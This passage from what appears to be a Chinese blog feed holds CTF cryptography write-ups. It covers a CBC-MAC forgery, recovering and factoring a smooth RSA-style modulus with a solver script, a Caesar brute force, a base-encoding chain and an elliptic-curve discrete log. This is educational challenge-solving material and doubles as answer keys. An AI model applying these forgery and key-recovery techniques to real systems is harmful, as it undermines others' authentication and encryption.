          AUTH(tag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] Invalid Choice&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;:( Oops!&quot;</span>, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Terminating Session!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>上面那张图没有白拿，考点CBC，无攻击手法，完全是对流程图的改造</p>
<p>有两种做法，用pwntools交互还是有点头疼，做的时候直接手撕了</p>
<p>这是第一次<code>secret_tag = MAC(secret_msg)</code>的流程</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC.png" alt="AES_CBC"></p>
<p>已知明文，要求密文块2；如果我们能得到第三次加密偏移量IV’，这样放进AES加密就能得到密文块2</p>
<p>第一种做法</p>
<p>第一次送明文块0去异或，将得到的<strong>密文块0</strong>与<strong>已知的IV</strong>以及<strong>明文块1</strong>异或，再将得到的结果拼接上明文块2送去AES加密，将得到密文块2在第三次verify时输入，得到flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC_attack.png" alt="AES_CBC_attack"></p>
<p>还有一种做法类似，将明文块0和1和起来进行第一次加密</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC_attack2.png" alt="AES_CBC_attack2"></p>
<p>脚本写的太丑就不展示了</p>
<p>块密码还是挺有趣的，不要像之前的我一样，因为不懂DES和AES的加密流程就放弃做题而被拒之门外</p>
<h3 id="Crypto-baby-crypto"><a href="#Crypto-baby-crypto" class="headerlink" title="Crypto-baby_crypto"></a>Crypto-baby_crypto</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_bytes</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	a = getPrime(<span class="number">512</span>)</span><br><span class="line">	b = reduce(mul, [getPrime(<span class="number">64</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)])</span><br><span class="line">	flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">	flag_int = bytes_to_long(flag + token_bytes(<span class="number">20</span>))</span><br><span class="line">	<span class="keyword">if</span> flag_int &gt; b:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;this was not supposed to happen&quot;</span>)</span><br><span class="line">		exit()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Try decrypting this =&gt;&quot;</span>, <span class="built_in">pow</span>(flag_int, a, b))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Hint =&gt;&quot;</span>, a)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Thanks for helping me test this out,&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Now try to break it&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">		inp = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>))</span><br><span class="line">		<span class="keyword">if</span> inp % b <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>, b - <span class="number">1</span>]:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;No cheating &gt;:(&quot;</span>)</span><br><span class="line">			exit()</span><br><span class="line">		res = <span class="built_in">pow</span>(flag_int, inp * a, b)</span><br><span class="line">		<span class="built_in">print</span>(res)</span><br><span class="line">		<span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		main()</span><br><span class="line">	<span class="keyword">except</span> Exception:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;oopsie&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>很像RSA的n未知，随便搜了一下，在wiki上搜到<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/">RSA选择明文攻击</a>，很好懂</p>
<p>现在摆在我们面前的就有两条路子，因为只能循环两遍，所以用了选择明文攻击后，就不能继续按照题目的思路将res变成1了</p>
<p>我更喜欢直接点打</p>
<p>只要b能出来，绝对可以得到很好的分解，虽然这次factordb没有分解出来（分解不了光滑数我实在没想到），但是yafu和椭圆曲线分解都出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">20203085489987560014293976792631284029865794716340199579184268249383267835221417646400206440280554986191046482410144704655493648278552773961629440429092902828200586765600142014056717474264892592819336816357109261631354026033919601</span></span><br><span class="line">a = <span class="number">9199145544343906785257237030819067819650706729960940719583789075672838085664891493875966859020683165873915514690329495098632224089726035146839813982911647</span></span><br><span class="line">res1 = <span class="number">11556035784052138857307507506198973288367411883788209466242603646975181772393709048116382813114147667439254757077994923530326940311774811806341624846606432421390147764067475588289999480688178793625567838893122456687987320482961046</span></span><br><span class="line">res2 = <span class="number">31851104354654545190670904771335276903093012765843101980283420984000643289499190154554669289569530261009163188908584430876887966331849339667406478926717953660650120468017201255286785290943940825754781159249398489654218469154878634</span></span><br><span class="line"><span class="comment"># b = gcd(c**2-res1, c**3-res2)</span></span><br><span class="line">b = <span class="number">35928904747031491940426212169291743107379982701504027058404714745969854722708017688279836779414010447803620033738718602141821905862755021890356381265244649437631255336699627199559173294827426763360743177116198238833752565119866603</span></span><br><span class="line">p1 = <span class="number">9663156357322877677</span></span><br><span class="line">p2 = <span class="number">17687198236208397641</span></span><br><span class="line">p3 = <span class="number">13483379498110779557</span></span><br><span class="line">p4 = <span class="number">9827362203600815249</span></span><br><span class="line">p5 = <span class="number">16048195073366111129</span></span><br><span class="line">p6 = <span class="number">9608504155966563959</span></span><br><span class="line">p7 = <span class="number">17592003464121633761</span></span><br><span class="line">p8 = <span class="number">16940133308409174757</span></span><br><span class="line">p9 = <span class="number">10013743477508178887</span></span><br><span class="line">p10 = <span class="number">18085688756284030699</span></span><br><span class="line">p11 = <span class="number">15237723747921143731</span></span><br><span class="line">p12 = <span class="number">12510206954070273583</span></span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">    p.append(<span class="built_in">eval</span>(<span class="string">&#x27;p&#x27;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">assert</span> b == reduce(mul, [_ <span class="keyword">for</span> _ <span class="keyword">in</span> p])</span><br><span class="line">phi = reduce(mul, [_-<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> p])</span><br><span class="line">d = invert(a, phi)</span><br><span class="line">flag_int = long_to_bytes(<span class="built_in">pow</span>(c, d, b))</span><br><span class="line"><span class="built_in">print</span>(flag_int)</span><br></pre></td></tr></table></figure>

<p>别的思路我没有尝试了</p>
<p>扪心自问，这种题目才22解吗？看来参赛选手不多</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题目做得爽快啊，虽然不长，但是考点很灵活，但是即使比赛结束还是有复现的必要的，趁着靶机没关；但是国内的题目，密码学少的可怜，要混口饭吃还是得学pwn</p>
<p>还有学到了歪果仁还很喜欢的一种字节与十六进制编码的转化，以及用pwntools里的xor进行字节的异或操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">xor(<span class="built_in">bytes</span>.fromhex(STRING1), <span class="built_in">bytes</span>.fromhex(STRING2)).<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210713 redpwnCrypto方向部分WP</title>
    <url>/posts/e1a0b897/</url>
    <content><![CDATA[<p>国外的比赛，赛后当赛时打，也不知道什么时候靶机会关掉</p>
<span id="more"></span>

<h1 id="redpwn"><a href="#redpwn" class="headerlink" title="redpwn"></a>redpwn</h1><h2 id="scissor"><a href="#scissor" class="headerlink" title="scissor"></a>scissor</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">egddagzp_ftue_rxms_iuft_rxms_radymf</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">key = random.randint(<span class="number">0</span>, <span class="number">25</span>)</span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">shifted = alphabet[key:] + alphabet[:key]</span><br><span class="line">dictionary = <span class="built_in">dict</span>(<span class="built_in">zip</span>(alphabet, shifted))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([</span><br><span class="line">    dictionary[c]</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> dictionary</span><br><span class="line">    <span class="keyword">else</span> c</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">input</span>()</span><br><span class="line">]))</span><br></pre></td></tr></table></figure>

<p>题目提示凯撒，但有点变行，直接爆破 key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;egddagzp_ftue_rxms_iuft_rxms_radymf&#x27;</span></span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    shifted = alphabet[key:] + alphabet[:key]</span><br><span class="line">    dictionary = <span class="built_in">dict</span>(<span class="built_in">zip</span>(alphabet, shifted))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([</span><br><span class="line">        dictionary[c]</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> dictionary</span><br><span class="line">        <span class="keyword">else</span> c</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> cipher</span><br><span class="line">    ]))</span><br></pre></td></tr></table></figure>



<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210713160001396.png" alt="image-20210713160001396"></p>
<p>对称密码，加密即解密</p>
<h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n: 228430203128652625114739053365339856393</span><br><span class="line">e: 65537</span><br><span class="line">c: 126721104148692049427127809839057445790</span><br></pre></td></tr></table></figure>

<p>简单 RSA</p>
<h2 id="round-the-bases（recuring）"><a href="#round-the-bases（recuring）" class="headerlink" title="round-the-bases（recuring）"></a>round-the-bases（recuring）</h2><blockquote>
<p>My flag has been all around the bases. Can you help me get it back?</p>
</blockquote>
<blockquote>
<p>9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:Jj8&lt;</p>
</blockquote>
<p>看wp的，签到也不会，不能太信任CyberChef的Magic；wp应该漏了一层base64</p>
<p>From Base85 -&gt;From Base64-&gt; From Hex -&gt; From Decimal -&gt; From Octal -&gt; From Binary</p>
<p>中间还是有被迷到，但结果没错</p>
<h2 id="blecc"><a href="#blecc" class="headerlink" title="blecc"></a>blecc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">p = 17459102747413984477</span><br><span class="line">a = 2</span><br><span class="line">b = 3</span><br><span class="line">G = (15579091807671783999, 4313814846862507155)</span><br><span class="line">Q = (8859996588597792495, 2628834476186361781)</span><br><span class="line">d = ???</span><br><span class="line">Can you help me find `d`?</span><br><span class="line">Decode it as a string and wrap in flag format.</span><br></pre></td></tr></table></figure>

<p>虽然知道是简单题，但是由于不会ECC，所以还是卡了好久</p>
<p>目标确实是求 d，和 DLP 很像，给了一个 p，可以想到是用类似 discrete_log 的方法解离散对数 ；看了很多师傅的笔记，La佬的 exp 中有个 P 不知道是啥，然后直接在 github 上搜 ECDLP，然后搜到下面这个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Curve parameters</span></span><br><span class="line">p = <span class="number">1048583</span></span><br><span class="line">a, b = <span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Target secret key</span></span><br><span class="line">d = <span class="number">4121</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup curve</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E.gen(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">P = d * G  <span class="comment"># (429940 : 231132 : 1)</span></span><br><span class="line"></span><br><span class="line">dl = discrete_log(P, G, G.order(), operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> dl == d</span><br></pre></td></tr></table></figure>

<p>依照他这个改一下</p>
